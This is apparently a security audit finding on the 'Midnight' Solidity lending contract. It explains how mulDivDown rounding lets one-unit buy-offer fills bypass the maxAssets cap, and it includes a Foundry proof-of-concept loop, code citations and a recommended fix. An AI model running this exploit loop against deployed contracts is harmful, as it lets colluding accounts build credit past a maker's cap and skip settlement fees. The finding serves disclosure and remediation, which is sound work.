### Title
`consumed` Underflow via `mulDivDown` Rounding on Buy Offers with `buyerPrice < WAD` Allows Unlimited Credit Accumulation Beyond `maxAssets` Cap - (`src/Midnight.sol`)

### Summary
When `offer.buy = true` and `offer.maxAssets > 0`, the `take` function increments `consumed[maker][group]` by `buyerAssets = units.mulDivDown(buyerPrice, WAD)`. Because `tickToPrice` is provably bounded to `<= WAD` for all valid ticks, any tick below `MAX_TICK` yields `buyerPrice < WAD`, causing `buyerAssets = 0` for small `units`. Each such fill leaves `consumed` unchanged while still mutating credit/debt/totalUnits state, allowing the `maxAssets` cap to be bypassed entirely across arbitrarily many fills.

### Finding Description

**Exact code path — `src/Midnight.sol` lines 358–373:**

```solidity
uint256 offerPrice = TickLib.tickToPrice(offer.tick);          // <= WAD always
uint256 buyerPrice = sellerPrice + _settlementFee;             // == offerPrice for buy offers
uint256 buyerAssets = offer.buy
    ? units.mulDivDown(buyerPrice, WAD)                        // rounds DOWN → 0 when units < WAD/buyerPrice
    : units.mulDivUp(buyerPrice, WAD);

if (offer.maxAssets > 0) {
    newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());  // trivially passes when buyerAssets == 0
}
```

**Price range constraint:** `TickLib.tickToPrice` is proven `<= WAD` for every valid tick (`tickToPriceAtMostWad` in `certora/specs/TickToPrice.spec` line 48). For any tick below `MAX_TICK`, `offerPrice < WAD`, so `buyerPrice < WAD`. For `units = 1`, `mulDivDown(1, buyerPrice, WAD) = floor(buyerPrice / WAD) = 0`.

**Exploit flow:**
1. Maker creates a buy offer: `offer.buy = true`, `offer.maxAssets = X`, `offer.tick < MAX_TICK` (any non-par price, e.g. `MAX_TICK - 16` as used in the existing test).
2. Attacker (maker's second address, or any willing taker) calls `take(offer, ..., units=1, ...)` in a loop N times.
3. Each iteration: `buyerAssets = 0`, `consumed += 0`, `require(0 <= X)` passes. Credit/debt/totalUnits all increase by 1 unit per call.
4. After N calls: `consumed[maker][group]` is unchanged (or at its pre-loop value), but the maker has accumulated N units of credit and the taker has N units of debt — with zero assets transferred.

**Why existing checks fail:**
- `require(newConsumed <= offer.maxAssets)` only guards against `consumed` exceeding the cap; it cannot fire when the increment is 0.
- `SelfTake` prevents `offer.maker == taker` but does not prevent the maker from controlling the taker address.
- The `makerFavorableRounding` Certora rule (`certora/specs/SettlementFeeSpread.spec` line 45) explicitly permits `buyerAssets = 0` as "favorable to the maker," so no formal property catches this.

**Codebase acknowledgment:** The protocol's own NatSpec at `src/Midnight.sol` line 94 states: *"It is possible to give units to a fully consumed assets-based buy offer with price < 1."* The test `testBugBuyMaxAssetsBypass` in `test/TakeTest.sol` lines 857–889 explicitly demonstrates the bypass with assertions confirming `buyerAssets = 0`, `consumed` unchanged, yet `creditOf`, `debtOf`, and `totalUnits` all strictly increased.

### Impact Explanation

The `maxAssets` cap — the maker's primary commitment to limit total buyer-side spend — is rendered ineffective for any buy offer with `buyerPrice < WAD`. An attacker controlling both the maker and taker addresses can accumulate unbounded credit (lender position) without paying any loan tokens, violating the invariant that `consumed` accurately reflects total fill and that offers cannot be overfilled beyond their stated cap. The `claimableSettlementFee` accounting is also corrupted: `buyerAssets - sellerAssets = 0` is added per fill, so settlement fees are never collected for these fills despite real unit-level exposure being created.

### Likelihood Explanation

**Preconditions:**
- `offer.buy = true`, `offer.maxAssets > 0`, `offer.tick < MAX_TICK` (satisfied by any non-par price — the entire usable price range except the single tick at par).
- Attacker controls or coordinates with both the maker address and a separate taker address (bypasses `SelfTake`).
- No collateral constraint on the buyer (maker); the seller/taker must have sufficient collateral for the debt.

**Feasibility:** Trivially reachable. The tick condition is satisfied by the vast majority of real offers. The two-address requirement is a low bar (EOA + contract, or two EOAs). Repeatable indefinitely within a single block via `multicall`.

### Recommendation

Replace the `mulDivDown` consumed increment for buy offers with `mulDivUp` to ensure `consumed` is never understated relative to actual fill:

```solidity
// In the maxAssets branch, use ceiling rounding for consumed tracking:
newConsumed = consumed[offer.maker][offer.group] +=
    offer.buy ? units.mulDivUp(buyerPrice, WAD) : sellerAssets;
```

This decouples the consumed accounting (conservative, ceiling) from the actual payment (`buyerAssets`, floor, maker-favorable). Alternatively, add a guard `require(units == 0 || buyerAssets > 0)` when `offer.buy && offer.maxAssets > 0` to reject zero-asset fills outright, consistent with the intent that `maxAssets` tracks real economic throughput.

### Proof of Concept

```solidity
// Foundry unit test — extends TakeTest setup
function testConsumedUnderflowBuyMaxAssets() public {
    // Any tick below MAX_TICK gives buyerPrice < WAD.
    lenderOffer.buy = true;
    lenderOffer.maxUnits = 0;
    lenderOffer.maxAssets = 1000; // maker intends to pay at most 1000 assets
    lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD → buyerAssets=0 for units=1

    uint256 N = 500;
    deal(address(loanToken), lender, 0);          // lender pays nothing
    collateralize(market, borrower, N);            // taker needs collateral for debt

    uint256 consumedBefore = midnight.consumed(lender, lenderOffer.group);

    for (uint256 i = 0; i < N; i++) {
        (uint256 buyerAssets,) = take(1, borrower, lenderOffer);
        assertEq(buyerAssets, 0, "buyerAssets must be 0 per fill");
    }

    uint256 consumedAfter = midnight.consumed(lender, lenderOffer.group);

    // consumed did not increase despite N fills
    assertEq(consumedAfter, consumedBefore, "consumed unchanged — cap bypassed");
    // but credit/debt state changed
    assertEq(midnight.creditOf(id, lender), N, "lender got N units of credit for free");
    assertEq(midnight.debtOf(id, borrower), N, "borrower has N units of debt");
    // consumed << maxAssets, yet N >> maxAssets-worth of units were filled
    assertLt(consumedAfter, lenderOffer.maxAssets);
}
```

Expected: all assertions pass, demonstrating that `consumed` is strictly less than the economic fill and the `maxAssets` cap is bypassed. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** src/Midnight.sol (L93-94)
```text
/// @dev Midnight can call the callback of offers through a no-op take, even if those offers have consumed==max.
/// @dev It is possible to give units to a fully consumed assets-based buy offer with price < 1.
```

**File:** src/Midnight.sol (L363-373)
```text
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
        uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : units.mulDivUp(sellerPrice, WAD);

        uint256 newConsumed;
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
        } else {
            newConsumed = consumed[offer.maker][offer.group] += units;
            require(newConsumed <= offer.maxUnits, ConsumedUnits());
        }
```

**File:** test/TakeTest.sol (L857-889)
```text
    // Show that a buy offer with offerPrice < WAD can be taken with units > 0
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
```

**File:** src/libraries/TickLib.sol (L44-52)
```text
    function tickToPrice(uint256 tick) internal pure returns (uint256) {
        require(tick <= MAX_TICK, TickOutOfRange());
        unchecked {
            // forge-lint: disable-next-item(unsafe-typecast)
            return uint256(1e36)
                    .divHalfDownUnchecked(1e18 + wExp(LN_ONE_PLUS_DELTA * (int256(MAX_TICK / 2) - int256(tick))))
                    .divHalfDownUnchecked(PRICE_ROUNDING_STEP) * PRICE_ROUNDING_STEP;
        }
    }
```

**File:** certora/specs/TickToPrice.spec (L46-50)
```text
// Tick to price is at most 1e18.
// This notably ensures that offer prices are at most 1e18.
rule tickToPriceAtMostWad(uint256 tick) {
    assert tickToPrice(tick) <= 10 ^ 18;
}
```

**File:** certora/specs/SettlementFeeSpread.spec (L34-46)
```text
// Rounding always favors the maker:
//   1. buyer-maker pays at most floor(units * offerPrice / WAD).
//   2. seller-maker receives at least ceil(units * offerPrice / WAD).
// Note also that this rule ensures that the settlement fee is applied on the taker price, not the maker price.
rule makerFavorableRounding(env e, Midnight.Offer offer, bytes ratifierData, uint256 units, address taker, address receiver, address takerCallback, bytes takerCallbackData) {
    uint256 offerPrice = summaryTickToPrice(offer.tick);

    uint256 buyerAssets;
    uint256 sellerAssets;
    buyerAssets, sellerAssets = take(e, offer, ratifierData, units, taker, receiver, takerCallback, takerCallbackData);

    assert offer.buy => buyerAssets * WAD() <= units * offerPrice;
    assert !offer.buy => sellerAssets * WAD() >= units * offerPrice;
```
